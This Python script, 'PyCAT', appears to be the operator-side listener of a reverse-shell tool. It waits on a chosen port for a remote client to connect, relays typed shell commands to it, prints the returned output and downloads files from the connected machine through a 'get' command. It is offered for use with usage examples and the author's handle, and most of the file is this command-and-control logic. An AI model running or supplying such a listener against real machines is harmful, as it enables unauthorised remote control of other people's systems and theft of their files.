#!/usr/bin/env python3

from tqdm import tqdm
import socket
import os
import sys

def banner():
	os.system("clear")
	print("=== PyCAT By 0x776F6C66 @wolf ===")

if len(sys.argv) != 2:
	banner()
	print("Usage: ./server.py port")
	print("Example: ./server.py 1234")
	print("By default the script listens on all interfaces")
	exit()

ip = "0.0.0.0" # listen on all interfaces //CHANGE THIS IF NEEDED
port =  int(sys.argv[1])#

def handler():
	tries = 0
	try:
		banner() #display banner
		
		# create tcp ipv4 socket, bind it to the ip and port, listen and accept connections
		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #reuse the port if needed
		server.bind((ip, port))
		server.listen(1)
		print(f"[*] Listening on {ip} port {port}")
		conn, addr = server.accept()
		print(f"[*] {addr[0]} connected..")
		
		while True:
			command = input("##: ") #prompt
			# catch empty commands and commands meant for the local machine
			if command == "":
				continue
			elif command.lower() == "clear":
				os.system("clear")
				banner()
				continue			
			conn.send(command.encode())
			
			###////////////////////////////////////// DOWNLOAD FILES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
			if command.startswith("get"): # check if download command is set which is "get"			
				# get the file name from the command
				if "/" in command:
					file = command.split("/")[-1]
					if file == "":
						print("Empty file")
						continue
				else:
					file = command.strip("get").strip(" ").strip("/n")
					if file == "":
						print("Empty file")
						continue				
				size = conn.recv(1024)
				if "No such file or directory" in size.decode(): # if the file is not found, throw error
					print("No such file or directory")
					continue
				if not isinstance(int(size.decode()), int): # 'size' of the file is a number, if the size received is anything else, raise an error
					print("Error getting size of the file ;)") 
					continue
				try:				
					with open(file) as f: # check if file exists
						while True:
							overwrite = input("File exists. OVERWRITE (y/n)?") #make sure the user wishes to overwrite the file
							if overwrite.lower() == "y":
								x = open(file, "a+") # open the file in append mode, create if not exist
								for i in tqdm(range(int(size.decode())), desc=file+" ..."): # the progress bar displaying the download progress
									contents = conn.recv(1)  # receive the contents byte by byte
									x.write(contents.decode()) #write contents to file
								x.close()
								break
							if overwrite.lower() == "n": # break if user doesn't want to overwrite
								break
							else:    # if invalid option is chosen, stay in the loop
								continue
					continue
				
				except FileNotFoundError:
					x = open(file, "a+") #open file in append mode, if it doesn't exist on system
					for i in tqdm(range(int(size.decode())), desc=file+" ..."): # the progress bar displaying the dwonlo
						contents = conn.recv(1)
						x.write(contents.decode())
					x.close()
					continue
					# send the commands, recv output and display it			
			
			###/////////////////////////////////// CHANGE DIRECTORIES \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
			if command.startswith("cd"):
				if tries == 0:
					print("\nFrom @0x776F6C66: Apparently cd breaks the program for some umknown reasons....")
					print("os.chdir() on the client program breaks it, other methods have been researched with no fruits..")
					print("Try not changing into any directories ;0 \n")
					tries = 1
				continue			
			
			###////////////////////////////////////// EXIT THE PROGRAM \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\###
			if command.lower() == "exit": # terminate the connection when the user wishes
				return "Connection terminated.. :0"			
			
			###////////////////////////// RECEIVE THE OUTPUT OF COMMANDS \\\\\\\\\\\\ by 0x776F6C66 @wolf \\\\\\\\### 
			result = conn.recv(1024)
			if result.decode() == "": # check of the client has terminated connection
				return "Connection terminated.. :0"
			print(result.decode().strip("\n"))	
	
	except KeyboardInterrupt:
		exit()
	except:
		return "error"
	

def main():
	while True:
		x = handler()
		print("\n"+x)
		option = input("Restart (y/n)? ")
		if option.lower() == "y":
			continue
		elif option.lower() == "n":
			break


if __name__ == "__main__":
	main()